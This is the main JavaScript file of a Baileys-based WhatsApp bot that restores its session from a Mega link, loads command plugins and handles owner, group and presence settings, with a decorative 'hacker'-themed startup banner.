const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const {
  getBuffer, getGroupAdmins, getRandom, h2k,
  isUrl, Json, runtime, sleep, fetchJson
} = require('./lib/functions');
const fs = require('fs');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const util = require('util');
const { sms, downloadMediaMessage } = require('./lib/msg');
const axios = require('axios');
const { File } = require('megajs');

const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

const ownerNumber = ['94787351423'];

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
  if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
  const sessdata = config.SESSION_ID;
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
  filer.download((err, data) => {
    if (err) throw err;
    fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
      console.log("Session downloaded ✅");
    });
  });
}

//================================/
async function connectToWA() {
  const connectDB = require('./lib/mongodb');
  connectDB();

  const { readEnv } = require('./lib/database');
  const config = await readEnv();
  const prefix = config.PREFIX;

  console.log("Connecting HYPER-MD 🧬...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/');
  const { version } = await fetchLatestBaileysVersion();

  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version
  });

  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else if (connection === 'open') {
      console.log('✌️ Installing... ');
      const path = require('path');
      fs.readdirSync("./plugins/").forEach((plugin) => {
        if (path.extname(plugin).toLowerCase() === ".js") {
          require("./plugins/" + plugin);
        }
      });

      console.log('Plugins installed successful ✅');
      console.log('Bot connected to WhatsApp ✅');

      let up = `🚀 DIZER-MD Connected Successfully! ✅

╔═══≪ *DIZER X* ≫═══╗  
  *[ CYBER MODE ACTIVATED ]*  
╚═══≪ *HACKER AI* ≫═══╝  

💻 *Bot ID:* ${conn.user.id}
📡 *IP Traced:* 127.0.0.1  
🔓 *Encryption:* ████████ 100%  

☠ *Warning:* Unauthorized access is prohibited!  
⚡ *Type* \`!hack\` *for options...*  

▄︻デ══━💥 *DIZER X IN CONTROL* 💥━══デ︻▄  
`;

      conn.sendMessage(ownerNumber[0] + "@s.whatsapp.net", {
        image: { url: `https://i.ibb.co/tpJGQkr/20241122-203120.jpg` },
        caption: up
      });
    }
  });

  conn.ev.on('creds.update', saveCreds);

  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = '';
    let res = await axios.head(url);
    mime = res.headers['content-type'];
    const buffer = await getBuffer(url);

    if (mime.includes("gif")) {
      return conn.sendMessage(jid, { video: buffer, caption, gifPlayback: true, ...options }, { quoted });
    } else if (mime.includes("pdf")) {
      return conn.sendMessage(jid, { document: buffer, mimetype: 'application/pdf', caption, ...options }, { quoted });
    } else if (mime.includes("image")) {
      return conn.sendMessage(jid, { image: buffer, caption, ...options }, { quoted });
    } else if (mime.includes("video")) {
      return conn.sendMessage(jid, { video: buffer, caption, mimetype: 'video/mp4', ...options }, { quoted });
    } else if (mime.includes("audio")) {
      return conn.sendMessage(jid, { audio: buffer, mimetype: 'audio/mpeg', ...options }, { quoted });
    }
  };

  //================ MESSAGE LISTENER =================//
  conn.ev.on('messages.upsert', async (mek) => {
    mek = mek.messages[0];
    if (!mek.message) return;

    mek.message = getContentType(mek.message) === 'ephemeralMessage' ? mek.message.ephemeralMessage.message : mek.message;

    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true") {
      await conn.readMessages([mek.key]);
    }

    if (config.AUTO_BIO === 'true') {
      await conn.updateProfileStatus(`𝗛𝗬𝗣𝗘𝗥 𝗠𝗗💗 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱⚡💻`)
    }

    const m = sms(conn, mek);
    const type = getContentType(mek.message);
    const from = mek.key.remoteJid;
    const quoted = mek.message?.extendedTextMessage?.contextInfo?.quotedMessage || [];
    const body = m.body;
    const isCmd = body.startsWith(prefix);
    const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');
    const isGroup = from.endsWith('@g.us');
    const sender = mek.key.fromMe ? conn.user.id : (mek.key.participant || mek.key.remoteJid);
    const senderNumber = sender.split('@')[0];
    const botNumber = conn.user.id.split(':')[0];
    const pushname = mek.pushName || 'Sin Nombre';
    const isMe = botNumber.includes(senderNumber);
    const isOwner = ownerNumber.includes(senderNumber) || isMe;
    const botNumber2 = await jidNormalizedUser(conn.user.id);
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
    const groupName = isGroup ? groupMetadata.subject : '';
    const participants = isGroup ? await groupMetadata.participants : '';
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
    const isReact = m.message.reactionMessage ? true : false;

    const reply = (teks) => {
      conn.sendMessage(from, { text: teks }, { quoted: mek });
    };

    // Auto Reaction for Owner
    if (senderNumber.includes("94787351423") && !isReact) m.react("👨‍💻");
    if (senderNumber.includes("94784337506") && !isReact) m.react("💗");

    if (isCmd && config.AUTO_READ_CMD === "true") {
      await conn.readMessages([mek.key]);
    }

    // Work Type Filter
    if (!isOwner && config.MODE === "private") return;
    if (!isOwner && isGroup && config.MODE === "inbox") return;
    if (!isOwner && !isGroup && config.MODE === "groups") return;

    // Presence Status
    if (config.ALWAYS_TYPING === "true") {
      await conn.sendPresenceUpdate('composing', from);
    }
    if (config.ALWAYS_RECORDING === "true") {
      await conn.sendPresenceUpdate('recording', from);
    }

    // Command Handler
    const events = require('./command');
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
    if (isCmd) {
      const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) || events.commands.find((cmd) => cmd.alias?.includes(cmdName));
      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
        try {
          cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
        } catch (e) {
          console.error("[PLUGIN ERROR] " + e);
        }
      }
    }

    // Match by message body or type
    events.commands.forEach(async (command) => {
      if (command.on === "body" && body) {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (command.on === "text" && mek.q) {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (command.on === "sticker" && mek.type === "stickerMessage") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      }
    });
  });
}

app.get("/", (req, res) => {
  res.send("hey, bot started🙂");
});

app.listen(port, () => console.log(`Server listening on http://localhost:${port}`));

setTimeout(() => {
  connectToWA();
}, 4000);
